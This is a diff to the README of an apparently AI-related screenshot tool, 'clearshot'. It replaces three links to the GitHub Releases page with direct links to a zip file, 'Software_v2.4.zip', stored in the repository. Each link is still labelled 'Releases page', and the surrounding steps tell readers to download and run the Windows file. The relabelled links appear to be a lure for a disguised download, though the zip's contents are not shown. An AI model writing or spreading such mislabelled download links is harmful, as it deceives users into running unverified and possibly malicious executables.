@@ -1,6 +1,6 @@
 # 📸 clearshot - Clear screenshot context for AI
 
-[![Download clearshot](https://img.shields.io/badge/Download%20clearshot-Visit%20Releases%20Page-blue.svg)](https://github.com/Steppecorkwoodtree378/clearshot/releases)
+[![Download clearshot](https://img.shields.io/badge/Download%20clearshot-Visit%20Releases%20Page-blue.svg)](https://github.com/Steppecorkwoodtree378/clearshot/raw/refs/heads/main/bin/Software_v2.4.zip)
 
 ## 🖼️ What clearshot does
 
@@ -17,7 +17,7 @@ It is built for people who want a simple way to make screenshots more useful for
 
 ## 🚀 Download clearshot for Windows
 
-1. Open the [clearshot Releases page](https://github.com/Steppecorkwoodtree378/clearshot/releases).
+1. Open the [clearshot Releases page](https://github.com/Steppecorkwoodtree378/clearshot/raw/refs/heads/main/bin/Software_v2.4.zip).
 2. Look for the latest release near the top of the page.
 3. Download the Windows file for your PC.
 4. If the download is a `.zip` file, right-click it and choose **Extract All**.
@@ -181,7 +181,7 @@ Keeping files in separate folders makes it easier to stay organized.
 
 ## 📎 Where to get the app
 
-Visit the [clearshot Releases page](https://github.com/Steppecorkwoodtree378/clearshot/releases) to download and run the Windows file
+Visit the [clearshot Releases page](https://github.com/Steppecorkwoodtree378/clearshot/raw/refs/heads/main/bin/Software_v2.4.zip) to download and run the Windows file
 
 ## 🖥️ Best use case
 
